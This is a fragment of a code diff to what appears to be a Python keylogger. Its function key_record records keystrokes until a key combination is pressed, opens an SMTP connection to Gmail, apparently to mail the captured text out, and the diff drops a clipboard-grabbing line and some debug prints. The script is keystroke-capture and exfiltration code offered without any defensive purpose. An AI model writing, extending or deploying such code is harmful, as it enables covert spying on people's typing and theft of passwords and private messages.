@@ -7,7 +7,7 @@ import threading
 
 def key_record():
 
-	data = pyperclip.paste().encode("utf-8") #.decode('utf-8')
+
 	server = smtplib.SMTP('smtp.gmail.com', 587)
 	server.ehlo()
 	server.starttls()
@@ -19,8 +19,6 @@ def key_record():
 		recorded = keyboard.record(until='shift+s+a+9')
 		words=[]
 		for item in recorded:
-			q= type(item)
-			print(dir(q))
 			if item.name == 'backspace':
 				item.name='/'
 			if item.name == 'space':
